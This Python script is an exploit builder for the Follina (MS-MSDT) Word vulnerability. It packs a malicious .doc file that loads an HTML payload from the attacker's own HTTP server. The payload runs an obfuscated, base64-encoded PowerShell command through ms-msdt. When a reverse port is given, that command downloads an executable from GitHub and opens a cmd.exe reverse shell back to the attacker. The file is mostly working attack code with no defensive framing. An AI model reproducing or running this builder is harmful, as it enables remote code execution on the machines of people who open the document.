#!/usr/bin/env python3

import argparse
import zipfile
import tempfile
import shutil
import os
import netifaces
import ipaddress
import random
import base64
import http.server
import socketserver
import string
import socket
import threading

parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default="calc",
    help="command to run on the target (default: calc)",
)

parser.add_argument(
    "--output",
    "-o",
    default="./follina.doc",
    help="output maldoc file (default: ./follina.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)

parser.add_argument(
    "--reverse",
    "-r",
    type=int,
    default="-1",
    help="port to serve reverse shell on",
)


def main(args):

    # Parse the supplied interface
    # This is done so the maldoc knows what to reach out to.
    try:
        serve_host = ipaddress.IPv4Address(args.interface)                                          ####check if IP is valid IPv4 address
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][               ####if the person has given the interface name, then get the IP address from the interface name
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()

    # Copy the Microsoft Word skeleton into a temporary staging folder
    doc_suffix = "doc"                                                                              ####name of folder having unzipped docx file
    staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())                      ####creates temporary directory in /tmp/sdfds directory and is known as staging_dir
    )
    doc_path = os.path.join(staging_dir, doc_suffix)                                                ####added doc folder to /tmp/sdfds
    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))                                ####copied all files from ./doc folder to /tmp/sdfds/doc/ where sdfds is randomly generated using python module
    print(f"[+] copied staging doc {staging_dir}")

    # Prepare a temporary HTTP server location
    serve_path = os.path.join(staging_dir, "www")                                                   ####created /tmp/sdfds/www
    os.makedirs(serve_path)

    # Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )

    with open(document_rels_path) as filp:
        external_referral = filp.read()                                                             ####simple read of /tmp/sfds/doc/word/_rels/document.xml.rels

    if args.reverse !=-1:                                                                           ####if person has given valid port number for reverse tcp
        external_referral = external_referral.replace(
        "{staged_html}", f"http://{serve_host}:{args.reverse}/index.html"                           ####Attcker IP and Port where the http payload is served
    )
    else:
        external_referral = external_referral.replace(
        "{staged_html}", f"http://{serve_host}:{args.port}/index.html")

    with open(document_rels_path, "w") as filp:                                                     ####Written the changed payload in xml file
        filp.write(external_referral)

    # Rebuild the original office file
    shutil.make_archive(args.output, "zip", doc_path)                                               ####Created zip file of /tmp/sdfds/doc/  
    os.rename(args.output + ".zip", args.output)

    print(f"[+] created maldoc {args.output}")                                                      ####Created document file of name provided by user

    command = args.command
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/AnshVaid4/temp/blob/main/rev.exe?raw=true -OutFile C:\\Windows\\Tasks\\rev.exe; C:\\Windows\\Tasks\\rev.exe -e cmd.exe {serve_host} {args.reverse}"""    ####execute nc and then execute cmd.exe and connect to attacker IP and attacker port

    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])                       ####create random 4096 characters and add to the comment of payload but it won't affect since its a comment
        + "\n</script>"
    )

    # Create our HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as filp:
        filp.write(html_payload)

    if args.reverse:
        os.system("python -m http.server --directory "+serve_path+" "+str(args.reverse) )


if __name__ == "__main__":

    main(parser.parse_args())

